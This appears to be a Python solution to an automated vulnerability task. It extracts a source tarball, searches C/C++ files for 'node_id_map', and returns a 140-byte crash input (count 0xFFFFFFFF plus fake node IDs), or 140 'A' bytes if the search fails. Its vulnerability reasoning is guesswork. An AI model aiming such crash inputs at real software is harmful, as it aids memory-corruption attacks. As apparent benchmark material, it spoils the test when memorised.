import os
import tarfile
import tempfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for C/C++ source files
            source_files = []
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.c', '.cpp', '.cc', '.cxx', '.h', '.hpp')):
                        source_files.append(os.path.join(root, file))
            
            # Analyze files for vulnerability pattern
            poc = self.generate_poc(source_files)
            if poc:
                return poc
            
            # Fallback: 140 bytes pattern if analysis fails
            return b'A' * 140
    
    def generate_poc(self, source_files):
        """
        Analyze source files to generate PoC.
        Returns bytes if successful, None otherwise.
        """
        # Look for node_id_map usage patterns
        for file in source_files:
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Look for patterns suggesting binary format with node IDs
                # Common patterns: uint32_t, size_t, vector/map operations
                if 'node_id_map' in content:
                    # Try to determine data format
                    # Common binary formats use 4-byte integers for counts/IDs
                    # We'll craft a minimal binary structure that triggers overflow
                    
                    # Pattern: likely has count followed by node data
                    # We'll create a malicious count that causes overflow
                    # 140 bytes total: 4 bytes count + 136 bytes data
                    
                    # Use count that leads to buffer overflow when processed
                    # 0xFFFFFFFF or large value that causes integer overflow
                    count = 0xFFFFFFFF
                    
                    # Create binary data
                    # Little-endian count
                    data = struct.pack('<I', count)
                    
                    # Fill remaining with pattern that may trigger dereference
                    # of non-existent nodes in node_id_map
                    remaining = 140 - len(data)
                    # Pattern: sequence of node IDs that don't exist
                    # Using incrementing IDs that overflow buffer
                    for i in range(0, remaining, 4):
                        data += struct.pack('<I', i)
                    
                    # Trim to exactly 140 bytes
                    return data[:140]
                    
            except:
                continue
        
        return None